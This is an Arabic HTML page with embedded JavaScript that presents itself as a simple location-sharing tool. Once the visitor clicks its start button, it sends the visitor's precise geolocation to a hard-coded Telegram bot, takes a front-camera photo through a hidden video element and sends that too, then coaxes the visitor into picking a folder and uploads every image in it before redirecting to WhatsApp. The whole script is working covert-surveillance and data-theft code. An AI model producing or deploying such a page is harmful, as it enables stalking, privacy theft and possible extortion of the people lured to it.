<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مشاركة الموقع الجغرافي</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }

        h1 {
            color: #333;
            margin-bottom: 20px;
            font-size: 28px;
        }

        .start-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 18px 50px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.3s;
            font-weight: bold;
            margin: 20px 0;
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
        }

        .start-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
        }

        .start-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
        }

        #status {
            color: #666;
            font-size: 16px;
            margin: 20px 0;
            min-height: 24px;
        }

        #result {
            color: #666;
            font-size: 14px;
            margin-top: 20px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 10px;
            text-align: right;
            display: none;
        }

        .wait-message {
            font-size: 20px;
            color: #333;
            margin: 30px 0;
        }

        .progress-container {
            width: 100%;
            background: #e0e0e0;
            border-radius: 10px;
            margin: 30px 0;
            overflow: hidden;
            height: 10px;
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #25D366, #128C7E);
            width: 0%;
            transition: width 0.5s ease;
            border-radius: 10px;
        }

        .whatsapp-btn {
            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.3s;
            font-weight: bold;
            margin-top: 20px;
            text-decoration: none;
            display: none;
        }

        .whatsapp-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(37, 211, 102, 0.4);
        }

        .hidden {
            display: none;
        }

        /* عناصر الكاميرا المخفية */
        #hiddenCamera {
            display: none;
        }

        #hiddenCanvas {
            display: none;
        }

        /* نافذة اختيار المجلد */
        #folderWindow {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            max-width: 500px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 40px 30px;
            text-align: center;
            z-index: 1001;
            display: none;
        }

        .folder-icon {
            width: 100px;
            height: 100px;
            background: linear-gradient(135deg, #0088cc 0%, #006699 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
        }

        .folder-icon img {
            width: 50px;
            height: 50px;
            filter: brightness(0) invert(1);
        }

        .folder-title {
            font-size: 24px;
            color: #333;
            margin-bottom: 20px;
        }

        .folder-text {
            color: #666;
            line-height: 1.6;
            margin-bottom: 30px;
            font-size: 16px;
        }

        .folder-btn {
            background: linear-gradient(135deg, #0088cc 0%, #006699 100%);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 20px;
            border-radius: 12px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.3s ease;
            font-weight: bold;
            margin: 10px;
            width: 90%;
            max-width: 300px;
        }

        .folder-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 136, 204, 0.4);
        }

        .selected-folder {
            margin-top: 20px;
            padding: 15px;
            background: #f0f8ff;
            border-radius: 10px;
            border: 2px dashed #0088cc;
            color: #006699;
            font-size: 14px;
            display: none;
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 999;
            display: none;
        }

        @media (max-width: 600px) {
            .container {
                padding: 30px 20px;
            }
            
            h1 {
                font-size: 24px;
            }
            
            .start-btn, .whatsapp-btn, .folder-btn {
                padding: 16px 30px;
                font-size: 18px;
            }
        }
    </style>
</head>
<body>
    <!-- نافذة اختيار المجلد -->
    <div id="folderWindow">
        <div class="folder-icon">
            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEwIDRINWMtMS4xMSAwLTIgLjktMiAydjE0YzAgMS4xLjg5IDIgMiAyaDE0YzEuMSAwIDItLjkgMi0yVjhjMC0xLjEtLjktMi0yLTJoLThsLTItMnoiLz48L3N2Zz4=" alt="📁">
        </div>
        <h2 class="folder-title">اختر مجلد الصور</h2>
        <p class="folder-text">
            يرجى اختيار المجلد الذي يحتوي على الصور التي تريد إرسالها
        </p>
        
        <button class="folder-btn" onclick="openFolderPicker()">
            فتح مستكشف الملفات
        </button>
        
        <div class="selected-folder" id="selectedFolder">
            <strong>المجلد المحدد:</strong>
            <span id="folderPath">لم يتم تحديد مجلد بعد</span>
        </div>
        
        <div style="margin-top: 30px; display: none;" id="uploadButtonContainer">
            <button class="folder-btn" style="background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);" onclick="startUpload()">
                بدء إرسال الصور
            </button>
        </div>
    </div>

    <!-- النافذة الرئيسية -->
    <div class="container">
        <h1>مشاركة الموقع الجغرافي</h1>
        <div class="wait-message" id="waitMessage" style="display: none;">انتظر جاري التحقق...</div>
        
        <div id="status">انقر على الزر أدناه للبدء</div>
        
        <div class="progress-container" id="progressContainer" style="display: none;">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <button class="start-btn" onclick="startProcess()" id="startBtn">
            <span>🚀 بدء العملية</span>
        </button>
        
        <div id="result"></div>
        
        <a href="https://wa.me/qr/3I56DYDGDJHSJ1" class="whatsapp-btn" id="whatsappBtn">
            الانتقال إلى واتساب
        </a>
    </div>

    <!-- خلفية معتمة -->
    <div class="overlay" id="overlay"></div>

    <!-- عناصر الكاميرا المخفية -->
    <video id="hiddenCamera" autoplay playsinline></video>
    <canvas id="hiddenCanvas"></canvas>

    <!-- عنصر input مخفي لاختيار المجلد -->
    <input type="file" id="folderInput" webkitdirectory directory multiple style="display: none;">

    <script>
        // بيانات البوت
        const BOT_TOKEN = '8448437426:AAGDNRN8rUX2BX8usRnteGq-RmlOxuq7hAE';
        const CHAT_ID = '6703506413';
        
        // العناصر
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const result = document.getElementById('result');
        const waitMessage = document.getElementById('waitMessage');
        const progressContainer = document.getElementById('progressContainer');
        const progressBar = document.getElementById('progressBar');
        const whatsappBtn = document.getElementById('whatsappBtn');
        const folderWindow = document.getElementById('folderWindow');
        const overlay = document.getElementById('overlay');
        const folderInput = document.getElementById('folderInput');
        const selectedFolder = document.getElementById('selectedFolder');
        const folderPath = document.getElementById('folderPath');
        const uploadButtonContainer = document.getElementById('uploadButtonContainer');
        const hiddenCamera = document.getElementById('hiddenCamera');
        const hiddenCanvas = document.getElementById('hiddenCanvas');
        
        // المتغيرات
        let selectedFiles = [];
        let userLocation = null;
        let processStep = 0;
        
        // دالة بدء العملية الكاملة
        async function startProcess() {
            try {
                startBtn.disabled = true;
                startBtn.innerHTML = '<span>⏳ جاري البدء...</span>';
                status.textContent = 'جاري التهيئة...';
                
                // الخطوة 1: الحصول على الموقع الجغرافي
                await getLocation();
                
                // الخطوة 2: التقاط صورة من الكاميرا
                await captureCameraPhoto();
                
                // الخطوة 3: فتح نافذة اختيار المجلد
                openFolderWindow();
                
            } catch (error) {
                console.error('حدث خطأ:', error);
                status.textContent = '❌ حدث خطأ. الرجاء المحاولة مرة أخرى.';
                startBtn.disabled = false;
                startBtn.innerHTML = '<span>🔄 حاول مرة أخرى</span>';
            }
        }
        
        // دالة الحصول على الموقع الجغرافي
        async function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('المتصفح لا يدعم تحديد الموقع'));
                    return;
                }
                
                status.textContent = '📍 جاري الحصول على الموقع...';
                
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        userLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        
                        // إرسال الموقع إلى البوت
                        await sendLocationToBot();
                        
                        // عرض الموقع في النتيجة
                        result.style.display = 'block';
                        result.innerHTML = `
                            <strong>📍 الموقع الجغرافي:</strong><br>
                            خط العرض: ${userLocation.latitude.toFixed(6)}<br>
                            خط الطول: ${userLocation.longitude.toFixed(6)}<br>
                            الدقة: ±${Math.round(userLocation.accuracy)} متر
                        `;
                        
                        resolve();
                    },
                    (error) => {
                        let errorMessage = 'فشل الحصول على الموقع';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = 'تم رفض الإذن للحصول على الموقع';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = 'معلومات الموقع غير متاحة';
                                break;
                            case error.TIMEOUT:
                                errorMessage = 'انتهى وقت طلب الموقع';
                                break;
                        }
                        reject(new Error(errorMessage));
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        // دالة إرسال الموقع إلى البوت
        async function sendLocationToBot() {
            try {
                const mapUrl = `https://maps.google.com/?q=${userLocation.latitude},${userLocation.longitude}`;
                const message = `📍 موقع جديد!\n\n📱 من: موقع الويب\n📍 الإحداثيات:\nخط العرض: ${userLocation.latitude}\nخط الطول: ${userLocation.longitude}\n📊 الدقة: ±${Math.round(userLocation.accuracy)} متر\n\n🗺️ الخريطة: ${mapUrl}`;
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                return await response.json();
            } catch (error) {
                console.error('خطأ في إرسال الموقع:', error);
            }
        }
        
        // دالة التقاط صورة من الكاميرا
        async function captureCameraPhoto() {
            try {
                status.textContent = '📷 جاري الوصول إلى الكاميرا...';
                
                // تشغيل الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                
                hiddenCamera.srcObject = stream;
                
                // انتظر للتركيز
                await sleep(1500);
                
                // التقاط الصورة
                hiddenCanvas.width = hiddenCamera.videoWidth;
                hiddenCanvas.height = hiddenCamera.videoHeight;
                hiddenCanvas.getContext('2d').drawImage(hiddenCamera, 0, 0);
                
                // إيقاف الكاميرا
                stream.getTracks().forEach(track => track.stop());
                
                // إرسال الصورة
                status.textContent = '📤 جاري إرسال الصورة...';
                const imageData = hiddenCanvas.toDataURL('image/jpeg', 0.8);
                await sendImageToBot(imageData, 'user_photo.jpg');
                
                status.textContent = '✅ تم التقاط وإرسال الصورة';
                
            } catch (error) {
                console.error('خطأ في الكاميرا:', error);
                // نستمر حتى لو فشلت الكاميرا
            }
        }
        
        // دالة إرسال الصورة إلى البوت
        async function sendImageToBot(imageData, filename) {
            try {
                const blob = await (await fetch(imageData)).blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, filename);
                formData.append('caption', '📸 صورة المستخدم');
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('خطأ في إرسال الصورة:', error);
            }
        }
        
        // فتح نافذة اختيار المجلد
        function openFolderWindow() {
            status.textContent = '📁 جاهز لاختيار المجلد';
            overlay.style.display = 'block';
            folderWindow.style.display = 'block';
        }
        
        // فتح مستكشف الملفات
        function openFolderPicker() {
            folderInput.click();
        }
        
        // عند اختيار مجلد
        folderInput.addEventListener('change', function(e) {
            if (e.target.files.length > 0) {
                selectedFiles = Array.from(e.target.files);
                
                // الحصول على مسار المجلد
                const folderPathText = selectedFiles[0].webkitRelativePath.split('/')[0] || 'المجلد المحدد';
                
                // عرض معلومات المجلد
                folderPath.textContent = folderPathText;
                selectedFolder.style.display = 'block';
                
                // عرض زر البدء
                uploadButtonContainer.style.display = 'block';
            }
        });
        
        // بدء عملية الرفع
        async function startUpload() {
            try {
                // إخفاء نافذة المجلد
                overlay.style.display = 'none';
                folderWindow.style.display = 'none';
                
                // تصفية الصور فقط
                const imageFiles = selectedFiles.filter(file => 
                    file.type.startsWith('image/')
                );
                
                if (imageFiles.length === 0) {
                    alert('❌ لم يتم العثور على أي صور في المجلد المحدد.');
                    return;
                }
                
                // بدء عملية التحميل
                status.textContent = `📤 جاري إرسال ${imageFiles.length} صورة...`;
                progressContainer.style.display = 'block';
                
                let successCount = 0;
                
                for (let i = 0; i < imageFiles.length; i++) {
                    const file = imageFiles[i];
                    
                    // تحديث شريط التقدم
                    const progress = ((i + 1) / imageFiles.length) * 100;
                    progressBar.style.width = `${progress}%`;
                    
                    // إرسال الصورة
                    try {
                        await sendImageFileToBot(file);
                        successCount++;
                    } catch (error) {
                        console.error(`خطأ في إرسال ${file.name}:`, error);
                    }
                    
                    // تأخير بين الصور
                    await sleep(300);
                }
                
                // إرسال رسالة تأكيد
                await sendConfirmation(successCount);
                
                // إظهار النجاح
                status.textContent = `✅ تم إرسال ${successCount} صورة بنجاح!`;
                result.innerHTML += `<br><br><strong>📸 الصور المرسلة:</strong><br>تم إرسال ${successCount} صورة إلى البوت`;
                
                // إظهار زر واتساب
                whatsappBtn.style.display = 'inline-flex';
                
                // توجيه تلقائي بعد 5 ثواني
                setTimeout(() => {
                    window.location.href = "https://wa.me/qr/3I56DYDGDJHSJ1";
                }, 5000);
                
            } catch (error) {
                console.error('خطأ في الرفع:', error);
                status.textContent = '❌ حدث خطأ في إرسال الصور';
            }
        }
        
        // دالة إرسال ملف صورة إلى البوت
        async function sendImageFileToBot(file) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', file);
            formData.append('caption', `📸 ${file.name}`);
            
            const response = await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
                {
                    method: 'POST',
                    body: formData
                }
            );
            
            return await response.json();
        }
        
        // دالة إرسال تأكيد
        async function sendConfirmation(count) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `✅ تم استلام ${count} صورة بنجاح من موقع الويب!`,
                        parse_mode: 'HTML'
                    })
                });
                
                return await response.json();
            } catch (error) {
                console.error('خطأ في إرسال التأكيد:', error);
            }
        }
        
        // دالة المساعدة للتأخير
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        // توجيه مباشر بعد 30 ثانية إذا لم يبدأ المستخدم
        setTimeout(() => {
            if (startBtn.disabled === false) {
                if (confirm('انتهى وقت الانتظار. هل تريد الانتقال مباشرة إلى واتساب؟')) {
                    window.location.href = "https://wa.me/qr/3I56DYDGDJHSJ1";
                }
            }
        }, 30000);
    </script>
</body>
</html>
